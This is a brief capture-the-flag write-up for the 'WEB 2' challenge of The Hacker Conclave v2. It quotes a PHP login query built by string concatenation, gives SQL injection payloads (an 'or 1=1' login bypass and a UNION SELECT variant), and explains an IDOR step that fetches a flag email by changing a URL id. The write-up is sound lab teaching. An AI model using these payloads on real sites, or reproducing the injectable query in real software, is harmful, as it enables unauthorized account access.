---
title: "WEB 2 - The Hacker Conclave v2"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "union-select", "idor", "the-hacker-conclave", "the-hacker-conclave-v2", "ctf-writeup"]
summary: "In this part of index.php"
source:
  name: "CTFtime writeup #39693"
  url: "https://ctftime.org/writeup/39693"
ctf:
  name: "The Hacker Conclave v2"
  challenge: "WEB 2"
---

## Metadata

- **CTF:** The Hacker Conclave v2
- **Task:** WEB 2
- **Author team:** Sqli Enjoyer
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/39693>

---
# Real author: andermonreal  
# Analyzing source code

## SQLi exploit

In this part of index.php  
```  
$stmt = $db->prepare('SELECT * FROM usuarios WHERE username = "'.$_POST['user'].'" AND password = "'.sha1($_POST['pass']).'"');  
```

the variable user is not properly sanitized (nor the variable pass). So we could use `" or 1 = 1-- -` to bypass the login. The only problem is if we get an admin user. Because it will return a template. 

So lets just spicy up the injection:

```  
" union select usertype from usuarios where usertype != "admin"-- -  
```

We know the table and column, because is in the code.

## IDOR exploit

Opening one of the emails we get in read.php code. There we can se the id in the url. Changing that id to a 0, will get us a mail with the flag.
